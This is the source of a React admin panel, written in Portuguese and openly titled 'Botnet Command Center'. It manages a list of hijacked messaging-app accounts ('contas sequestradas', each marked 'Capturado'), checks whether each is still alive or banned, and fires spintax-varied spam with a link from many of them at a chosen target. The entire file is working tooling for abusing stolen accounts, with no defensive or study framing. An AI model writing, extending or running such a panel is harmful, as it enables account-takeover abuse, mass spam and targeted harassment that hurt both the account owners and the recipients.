import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [sessions, setSessions] = useState([]);
  const [target, setTarget] = useState(''); 
  const [msg, setMsg] = useState('{Olá|Oi}, vi que tem interesse em conteúdo VIP. {Confira|Veja} aqui: https://seulink.com');
  const [logs, setLogs] = useState([]);
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [processing, setProcessing] = useState(false);

  // Carrega lista ao iniciar
  const fetchSessions = async () => {
    const res = await fetch('/api/list-sessions');
    const data = await res.json();
    setSessions(data.sessions || []);
  };

  useEffect(() => { fetchSessions(); }, []);

  // Adiciona log no "Terminal"
  const addLog = (text, type = 'info') => {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [`[${time}] ${text}`, ...prev]);
  };

  // Seleção de Contas
  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone);
    else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const selectAll = () => {
    if (selectedPhones.size === sessions.length) setSelectedPhones(new Set());
    else setSelectedPhones(new Set(sessions.map(s => s.phone_number)));
  };

  // Ação: Verificar Saúde
  const checkHealth = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas para verificar');
    setProcessing(true);
    addLog(`=== Iniciando verificação de ${selectedPhones.size} contas ===`, 'warning');

    for (const phone of selectedPhones) {
        addLog(`Verificando ${phone}...`);
        const res = await fetch('/api/check-status', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone })
        });
        const data = await res.json();
        if (data.status === 'alive') addLog(`${phone} está ONLINE ✅`);
        else addLog(`${phone} parece MORTA/BANIDA ❌`);
    }
    setProcessing(false);
    fetchSessions(); // Recarrega lista
  };

  // Ação: Disparo em Massa
  const handleMassFire = async () => {
    if (!target) return alert('Defina um alvo (@usuario ou número)');
    if (selectedPhones.size === 0) return alert('Selecione contas para enviar');
    
    setProcessing(true);
    addLog(`=== Iniciando disparo para ${target} ===`, 'warning');

    // Transforma Set em Array
    const phones = Array.from(selectedPhones);

    for (const phone of phones) {
        addLog(`🚀 Enviando de: ${phone}...`);
        
        try {
            const res = await fetch('/api/dispatch', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    senderPhone: phone,
                    target: target,
                    message: msg
                })
            });

            const data = await res.json();
            
            if (res.ok) {
                addLog(`✅ Sucesso (${phone}): "${data.msg_sent}"`);
            } else {
                addLog(`❌ Erro (${phone}): ${data.error}`);
            }

            // Pequeno delay para não sobrecarregar o servidor (500ms)
            await new Promise(r => setTimeout(r, 500));

        } catch (e) {
            addLog(`❌ Erro Crítico: ${e.message}`);
        }
    }
    setProcessing(false);
    addLog(`=== Fim do Processo ===`, 'warning');
  };

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
      
      {/* Header */}
      <div style={{ borderBottom: '1px solid #30363d', paddingBottom: '20px', marginBottom: '20px' }}>
        <h1 style={{ color: '#58a6ff', margin: 0 }}>🕵️ Botnet Command Center</h1>
        <p style={{ color: '#8b949e', margin: '5px 0' }}>{sessions.length} contas sequestradas no total</p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
        
        {/* Coluna da Esquerda: Controles */}
        <div>
          <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #30363d' }}>
            <h3 style={{ marginTop: 0 }}>🎯 Configuração do Ataque</h3>
            
            <label style={{ display: 'block', marginBottom: '5px', fontSize: '12px' }}>Alvo (Username ou Telefone)</label>
            <input 
              type="text" 
              placeholder="@usuario_alvo" 
              value={target}
              onChange={e => setTarget(e.target.value)}
              style={{ width: '100%', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '4px', marginBottom: '15px' }}
            />

            <label style={{ display: 'block', marginBottom: '5px', fontSize: '12px' }}>Mensagem (Use {'{Spintax|Assim}'})</label>
            <textarea 
              value={msg}
              onChange={e => setMsg(e.target.value)}
              style={{ width: '100%', height: '100px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '4px', marginBottom: '15px' }}
            />

            <div style={{ display: 'flex', gap: '10px' }}>
                <button 
                  onClick={handleMassFire}
                  disabled={processing}
                  style={{ flex: 1, padding: '12px', background: processing ? '#23863655' : '#238636', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontWeight: 'bold' }}
                >
                  {processing ? 'EXECUTANDO...' : '🔥 DISPARAR EM MASSA'}
                </button>
                
                <button 
                  onClick={checkHealth}
                  disabled={processing}
                  style={{ padding: '12px', background: '#1f6feb', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
                >
                  🩺 Check Status
                </button>
            </div>
          </div>

          {/* Terminal de Logs */}
          <div style={{ marginTop: '20px', backgroundColor: '#000', padding: '15px', borderRadius: '6px', border: '1px solid #30363d', height: '300px', overflowY: 'auto', fontSize: '12px' }}>
            <div style={{ color: '#58a6ff', marginBottom: '10px' }}>root@hot-track:~# logs</div>
            {logs.map((l, i) => (
                <div key={i} style={{ marginBottom: '4px', color: l.includes('❌') ? '#ff7b72' : l.includes('✅') ? '#3fb950' : '#8b949e' }}>
                    {l}
                </div>
            ))}
            {logs.length === 0 && <span style={{color: '#333'}}>Aguardando comandos...</span>}
          </div>
        </div>

        {/* Coluna da Direita: Lista de Contas */}
        <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #30363d', overflowY: 'auto', maxHeight: '800px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px' }}>
                <h3 style={{ margin: 0 }}>🤖 Exército ({selectedPhones.size} selecionados)</h3>
                <button 
                    onClick={selectAll}
                    style={{ background: 'transparent', border: '1px solid #30363d', color: '#58a6ff', padding: '5px 10px', borderRadius: '4px', cursor: 'pointer', fontSize: '12px' }}
                >
                    {selectedPhones.size === sessions.length ? 'Desmarcar Todos' : 'Marcar Todos'}
                </button>
            </div>

            {sessions.map(s => (
                <div 
                    key={s.id} 
                    onClick={() => toggleSelect(s.phone_number)}
                    style={{ 
                        display: 'flex', 
                        alignItems: 'center', 
                        padding: '10px', 
                        marginBottom: '8px', 
                        borderRadius: '4px', 
                        cursor: 'pointer',
                        border: selectedPhones.has(s.phone_number) ? '1px solid #238636' : '1px solid transparent',
                        backgroundColor: selectedPhones.has(s.phone_number) ? '#23863622' : '#21262d'
                    }}
                >
                    <div style={{ width: '10px', height: '10px', borderRadius: '50%', backgroundColor: selectedPhones.has(s.phone_number) ? '#3fb950' : '#484f58', marginRight: '10px' }}></div>
                    <div style={{ flex: 1 }}>
                        <div style={{ fontWeight: 'bold' }}>{s.phone_number}</div>
                        <div style={{ fontSize: '10px', color: '#8b949e' }}>Capturado: {new Date(s.created_at).toLocaleDateString()}</div>
                    </div>
                    {/* Badge simples de ID */}
                    <span style={{ fontSize: '10px', background: '#30363d', padding: '2px 6px', borderRadius: '10px' }}>ID: {s.id}</span>
                </div>
            ))}
        </div>

      </div>
    </div>
  );
}
